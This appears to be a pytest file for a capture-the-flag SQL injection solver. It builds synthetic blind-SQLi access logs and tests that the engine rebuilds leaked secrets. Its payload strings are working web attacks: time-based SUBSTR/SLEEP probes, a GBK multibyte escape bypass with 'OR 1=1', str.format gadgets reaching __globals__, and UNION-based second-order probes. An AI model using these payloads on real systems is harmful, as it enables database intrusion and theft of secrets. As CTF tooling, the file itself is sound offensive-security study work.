"""B-022: SQLi engine -- blind-from-log, decode-mismatch, str.format/SSTI gadgets, second-order.

Every fixture is synthetic and built inside the test; no real challenge file is read and no network is
touched. The blind-from-log tests build an nginx-style access log whose probes encode a known secret
(with the real challenge's two traps: shuffled position order and percent-encoded guessed characters),
then assert the engine rebuilds exactly that secret and that ``solve`` reports it as a flag. The
decode-mismatch tests check the GBK/multibyte bypass against the real codecs, so they fail if the lead
bytes are wrong.
"""
from __future__ import annotations

import random
import string
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "solvers" / "web"))

import sqli_exfil as sx                 # noqa: E402  (flat import, the engine sys.path)
from ctf import event                  # noqa: E402
from ctf.result import SolverResult    # noqa: E402

CSCTF = event.load("csctf")
ALPHABET = string.ascii_letters + string.digits + "_{}"


# ---------------------------------------------------------------- building a synthetic blind-SQLi log
def _probe_line(ip: str, pos: int, char: str, rt: float, *, size: int = 33, encode: bool = False) -> str:
    """One nginx-combined + rt= log line for a time-based blind probe of `char` at `pos`."""
    guess = f"%{ord(char):02X}" if encode else char
    path = f"/api/status?unit=43'+AND+IF(SUBSTR(token,{pos},1)='{guess}',SLEEP(2),0)--+-"
    return (f'{ip} - - [13/Oct/2026:03:00:31 +0000] "GET {path} HTTP/1.1" 200 {size} '
            f'"-" "python-requests/2.32.3" rt={rt:.3f}')


def _blind_log(secret: str, *, seed: int = 7) -> str:
    """A time-based blind-SQLi access log that leaks `secret`: for each position the correct character's
    probe is slow (rt~2s) and a handful of wrong guesses are fast (rt~ms). Lines are shuffled (the real
    challenge's trap) and some correct characters are percent-encoded."""
    rng = random.Random(seed)
    lines = [f'203.0.113.9 - - [13/Oct/2026:03:00:30 +0000] "GET /api/status?unit=43 HTTP/1.1" 200 88 '
             f'"-" "python-requests/2.32.3" rt=0.003']  # one benign request + a scanner, as noise
    lines.append('198.51.100.5 - - [13/Oct/2026:03:00:30 +0000] "GET /.env HTTP/1.1" 404 153 '
                 '"-" "curl/8.0" rt=0.001')
    for i, ch in enumerate(secret, start=1):
        encode = ch in "_{}" or rng.random() < 0.3        # some correct chars arrive percent-encoded
        lines.append(_probe_line("198.51.100.66", i, ch, 2.0 + rng.random() * 0.05, encode=encode))
        for wrong in rng.sample([c for c in ALPHABET if c != ch], 4):
            lines.append(_probe_line("198.51.100.66", i, wrong, rng.random() * 0.05))
    rng.shuffle(lines)
    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------- parsing
def test_parse_probe_query_reads_char_and_ascii_shapes():
    assert sx.parse_probe_query("/x?u=1'+AND+IF(SUBSTR(token,6,1)='Z',SLEEP(2),0)--+-") == ("token", 6, "Z", "char-eq")
    assert sx.parse_probe_query("/x?u=1' AND IF(ASCII(SUBSTRING(pw,3,1))=65,SLEEP(2),0)-- -") == ("pw", 3, "A", "ascii-eq")
    assert sx.parse_probe_query("/x?u=1' AND IF(MID(token,2,1)='}',SLEEP(2),0)-- -") == ("token", 2, "}", "char-eq")
    assert sx.parse_probe_query("/api/status?unit=43") is None


def test_extract_probes_url_decodes_and_reads_rt_and_size():
    line = ('198.51.100.66 - - [x] "GET /api/status?unit=43%27+AND+IF(SUBSTR(token,16,1)=%27%7D%27,SLEEP(2),0)--+- '
            'HTTP/1.1" 200 33 "-" "ua" rt=2.024')
    probes = sx.extract_probes(line)
    assert len(probes) == 1
    p = probes[0]
    assert (p.column, p.pos, p.char, p.kind) == ("token", 16, "}", "char-eq")   # %7D decoded to }
    assert p.rt == 2.024 and p.size == 33 and p.status == 200


def test_extract_probes_skips_non_probe_and_malformed_lines():
    text = ('garbage line with no request\n'
            '203.0.113.9 - - [x] "GET /healthz HTTP/1.1" 200 2 "-" "ua" rt=0.001\n')
    assert sx.extract_probes(text) == []


# ---------------------------------------------------------------- reconstruction
def test_reconstruct_rebuilds_secret_from_time_oracle():
    secret = "CSCTF{bl1nd_t1m3_0racle}"
    recon = sx.reconstruct_from_log(_blind_log(secret))
    assert recon.signal == "time"
    assert recon.column == "token"
    assert recon.complete
    assert recon.text == secret
    assert recon.positions == tuple(range(1, len(secret) + 1))


def test_reconstruct_uses_size_oracle_when_no_timing():
    # Boolean blind: no rt field; the true answer returns a distinct (minority) body size.
    secret = "AB"
    lines = []
    for i, ch in enumerate(secret, start=1):
        lines.append(f'10.0.0.1 - - [x] "GET /p?u=1\'+AND+SUBSTR(s,{i},1)=\'{ch}\' HTTP/1.1" 200 12 "-" "ua"')
        for wrong in "XYZ":
            lines.append(f'10.0.0.1 - - [x] "GET /p?u=1\'+AND+SUBSTR(s,{i},1)=\'{wrong}\' HTTP/1.1" 200 47 "-" "ua"')
    recon = sx.reconstruct_from_log("\n".join(lines), signal="auto")
    assert recon.signal == "size"
    assert recon.text == secret


def test_reconstruct_marks_ambiguous_positions_without_raising():
    # Two different slow chars for position 1 -> ambiguous, filled with "?", not silently resolved.
    log = "\n".join([
        _probe_line("198.51.100.66", 1, "A", 2.01),
        _probe_line("198.51.100.66", 1, "B", 2.02),
        _probe_line("198.51.100.66", 2, "Z", 2.0),
        _probe_line("198.51.100.66", 2, "Q", 0.01),
    ])
    recon = sx.reconstruct_from_log(log)
    assert recon.text == "?Z"
    assert recon.ambiguous == {1: ("A", "B")}
    assert not recon.complete


def test_reconstruct_raises_when_no_oracle_signal():
    # All probes fast and one body size: nothing separates true from false.
    log = "\n".join(_probe_line("198.51.100.66", i, "A", 0.01) for i in range(1, 4))
    with pytest.raises(sx.ReconstructError):
        sx.reconstruct_from_log(log)


def test_reconstruct_rejects_mixed_columns():
    log = "\n".join([
        _probe_line("198.51.100.66", 1, "A", 2.0),
        '198.51.100.66 - - [x] "GET /p?u=1\'+AND+IF(SUBSTR(other,1,1)=\'B\',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "ua" rt=2.0',
    ])
    with pytest.raises(sx.ReconstructError):
        sx.reconstruct_from_log(log)


# ---------------------------------------------------------------- decode-mismatch (multibyte charset)
def test_absorbing_lead_bytes_are_real_gbk_lead_bytes():
    leads = sx.absorbing_lead_bytes("gbk")
    assert 0xBF in leads                      # the canonical 0xbf lead from pink #30
    # every reported lead really forms one char with 0x5c, and 0x5c alone decodes to a backslash
    for b in leads:
        assert len(bytes([b, 0x5C]).decode("gbk")) == 1
    assert b"\x5c".decode("gbk") == "\\"


def test_quote_survives_only_for_absorbing_leads():
    assert sx.quote_survives(0xBF, "gbk")                  # 0xbf5c is one char -> the 0x27 quote survives
    assert not sx.quote_survives(0x41, "gbk")              # ascii 'A': 0x5c stays a backslash, quote escaped


def test_multibyte_bypass_payloads_are_valid_and_decode_as_designed():
    payloads = sx.multibyte_bypass_payloads(tail=" OR 1=1-- -")
    assert any(p.charset == "gbk" for p in payloads)
    # the canonical 0xbf lead is reachable when the gbk cap is lifted
    full = sx.multibyte_bypass_payloads(charsets=("gbk",), max_per_charset=256)
    assert any(p.lead == 0xBF for p in full)
    for p in payloads:
        # the bytes the SERVER stores (lead + escaped quote) decode so that a live quote remains
        stored = bytes([p.lead]) + b"\\'"
        decoded = stored.decode(p.charset)
        assert decoded[-1] == "'"
        assert p.percent.startswith(f"%{p.lead:02x}%27")


def test_absorbing_lead_bytes_unknown_charset_raises():
    with pytest.raises(LookupError):
        sx.absorbing_lead_bytes("not-a-real-charset")


# ---------------------------------------------------------------- str.format / SSTI gadgets
def test_format_traversal_gadgets_are_valid_format_strings():
    gadgets = sx.format_traversal_gadgets(root="0", globals_keys=("config",), attr_targets=("secret",))
    assert "{0.__class__.__init__.__globals__}" in gadgets
    assert "{0.__class__.__init__.__globals__[config]}" in gadgets
    assert "{0.secret}" in gadgets
    fmt = string.Formatter()
    for g in gadgets:
        list(fmt.parse(g))                    # raises if malformed


def test_format_gadget_resolves_against_a_synthetic_object():
    # The attribute-access gadget really reaches an object attribute via str.format (no eval).
    class Dispatch:
        secret = "CSCTF{format_traversal}"
    gadget = sx.format_traversal_gadgets(attr_targets=("secret",))[-1]
    assert gadget == "{0.secret}"
    assert gadget.format(Dispatch()) == "CSCTF{format_traversal}"


# ---------------------------------------------------------------- stored / second-order
def test_second_order_probes_embed_marker_and_target_columns():
    probes = sx.second_order_probes(marker="m7", columns=("flag",))
    assert len(probes) == 1
    assert probes[0].marker == "m7"
    assert "m7'" in probes[0].store and "UNION SELECT flag" in probes[0].store


# ---------------------------------------------------------------- solve() entry
def test_solve_rebuilds_flag_from_access_log(tmp_path):
    secret = "CSCTF{07_beacon_tow_vigil_bollard_8c0371}"
    chal = tmp_path / "9134"
    (chal / "files").mkdir(parents=True)
    (chal / "files" / "access.log").write_text(_blind_log(secret), encoding="utf-8")
    res = sx.solve(chal, CSCTF)
    assert isinstance(res, SolverResult)
    assert res.status == "solved"
    assert res.flags == (secret,)
    assert res.evidence and res.evidence[0].path == "files/access.log"
    assert res.engine == "web.sqli_exfil"


def test_solve_reports_none_without_a_log(tmp_path):
    chal = tmp_path / "nolog"
    chal.mkdir()
    (chal / "readme.md").write_text("no logs here", encoding="utf-8")
    res = sx.solve(chal, CSCTF)
    assert res.status == "none"
    assert not res.flags


def test_solve_candidate_when_rebuilt_value_is_not_a_flag(tmp_path):
    # A recovered column value that is not in the event flag format is a candidate, not solved.
    secret = "s3cr3t_api_key_value"
    chal = tmp_path / "leak"
    chal.mkdir()
    (chal / "access.log").write_text(_blind_log(secret), encoding="utf-8")
    res = sx.solve(chal, CSCTF)
    assert res.status == "candidate"
    assert res.flags == (secret,)


def test_solve_unsure_when_read_is_ambiguous(tmp_path):
    log = "\n".join([
        _probe_line("198.51.100.66", 1, "A", 2.01),
        _probe_line("198.51.100.66", 1, "B", 2.02),   # two slow guesses at position 1
        _probe_line("198.51.100.66", 2, "Z", 2.0),
    ])
    chal = tmp_path / "amb"
    chal.mkdir()
    (chal / "access.log").write_text(log, encoding="utf-8")
    res = sx.solve(chal, CSCTF)
    assert res.status == "unsure"
    assert not res.flags


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-q"]))
